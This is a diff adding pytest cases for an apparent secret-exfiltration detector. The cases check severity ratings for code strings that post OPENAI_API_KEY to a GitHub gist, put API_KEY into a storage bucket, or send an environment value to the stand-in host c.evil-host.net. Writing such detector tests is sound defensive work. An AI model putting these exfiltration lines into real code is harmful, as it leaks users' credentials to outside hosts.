@@ -822,3 +822,31 @@ def test_shell_reassignment_from_the_same_env_var_is_still_a_read():
     )
     assert _exfil("gh-env.sh", src)[0] is None
     assert _exfil("g.sh", src.replace("api.github.com", "c.evil-host.net"))[0] == "critical"
+
+
+# ── Write-back APIs (gists, repo files, HF uploads, buckets) are not an excuse ──
+
+def test_foreign_key_to_a_gist_is_not_excused():
+    gist = 'requests.post("https://api.github.com/gists", json={{"files": {{"k": {{"content": {}}}}}}})\n'
+    src = "import os, requests\n" + gist.format('os.environ["OPENAI_API_KEY"]')
+    assert _exfil("a.py", src)[0] in ("high", "critical")
+    # a key that names no vendor (normally excused at a known API) is Review there
+    src = "import os, requests\n" + gist.format('os.environ["TTS_API_KEY"]')
+    assert _exfil("b.py", src)[0] == "high"
+
+
+def test_foreign_key_to_a_storage_bucket_is_review():
+    src = (
+        "import os, requests\n"
+        'requests.put("https://storage.googleapis.com/bkt/o", data=os.environ["API_KEY"])\n'
+    )
+    assert _exfil("a.py", src)[0] in ("high", "critical")
+
+
+def test_github_token_to_github_is_still_excused():
+    src = (
+        "import os, requests\n"
+        'requests.post("https://api.github.com/gists",'
+        ' headers={"Authorization": "token " + os.environ["GITHUB_TOKEN"]}, json={})\n'
+    )
+    assert _exfil("a.py", src)[0] is None
